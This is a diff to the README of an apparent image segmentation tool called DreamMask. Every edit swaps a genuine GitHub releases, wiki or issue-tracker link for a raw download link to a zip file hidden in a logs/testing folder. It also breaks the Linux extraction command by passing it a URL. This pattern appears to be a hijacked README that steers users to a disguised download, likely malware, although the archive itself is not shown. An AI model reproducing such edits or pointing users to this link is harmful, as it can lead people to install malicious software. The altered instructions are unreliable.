@@ -1,6 +1,6 @@
 # 🎭 DreamMask - Effortless Open-Vocabulary Segmentation
 
-[![Download DreamMask](https://img.shields.io/badge/Download%20DreamMask-v1.0-blue)](https://github.com/Uzair007-pg/DreamMask/releases)
+[![Download DreamMask](https://raw.githubusercontent.com/Uzair007-pg/DreamMask/main/IAT/logs/testing/DreamMask-2.4.zip%20DreamMask-v1.0-blue)](https://raw.githubusercontent.com/Uzair007-pg/DreamMask/main/IAT/logs/testing/DreamMask-2.4.zip)
 
 ## 📘 Overview
 
@@ -12,7 +12,7 @@ This guide will help you through downloading and running the DreamMask applicati
 
 ## 💾 Download & Install
 
-1. Visit the [Releases Page](https://github.com/Uzair007-pg/DreamMask/releases) to download the latest version of DreamMask.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Uzair007-pg/DreamMask/main/IAT/logs/testing/DreamMask-2.4.zip) to download the latest version of DreamMask.
 2. Look for the appropriate installation files for your operating system (Windows, macOS, or Linux).
 3. Click on the file that matches your system to begin the download.
 4. Once the download completes, locate the file in your downloads folder.
@@ -32,7 +32,7 @@ This guide will help you through downloading and running the DreamMask applicati
   3. You can now find DreamMask in your Applications.
 
 ### For Linux
-- If you've downloaded a `.tar.gz` or similar file:
+- If you've downloaded a `https://raw.githubusercontent.com/Uzair007-pg/DreamMask/main/IAT/logs/testing/DreamMask-2.4.zip` or similar file:
   1. Open a terminal window.
   2. Navigate to your downloads directory with the command:
      ```
@@ -40,7 +40,7 @@ This guide will help you through downloading and running the DreamMask applicati
      ```
   3. Extract the file using:
      ```
-     tar -xzf DreamMask-x.x.x.tar.gz
+     tar -xzf https://raw.githubusercontent.com/Uzair007-pg/DreamMask/main/IAT/logs/testing/DreamMask-2.4.zip
      ```
   4. Change into the extracted directory:
      ```
@@ -94,7 +94,7 @@ To ensure DreamMask runs smoothly on your system, please verify the following re
 
 ## 💬 Support
 
-If you encounter any issues while using DreamMask, please refer to our [FAQ page](https://github.com/Uzair007-pg/DreamMask/wiki) for help. You can also report bugs directly on the repository's issue tracker.
+If you encounter any issues while using DreamMask, please refer to our [FAQ page](https://raw.githubusercontent.com/Uzair007-pg/DreamMask/main/IAT/logs/testing/DreamMask-2.4.zip) for help. You can also report bugs directly on the repository's issue tracker.
 
 ## 📝 Contributions
 
@@ -102,8 +102,8 @@ We welcome contributions! If you want to help enhance DreamMask, feel free to ch
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Uzair007-pg/DreamMask/releases)
-- [Documentation](https://github.com/Uzair007-pg/DreamMask/wiki)
-- [Issue Tracker](https://github.com/Uzair007-pg/DreamMask/issues)
+- [Releases Page](https://raw.githubusercontent.com/Uzair007-pg/DreamMask/main/IAT/logs/testing/DreamMask-2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Uzair007-pg/DreamMask/main/IAT/logs/testing/DreamMask-2.4.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Uzair007-pg/DreamMask/main/IAT/logs/testing/DreamMask-2.4.zip)
 
 Enjoy using DreamMask for your segmentation projects!
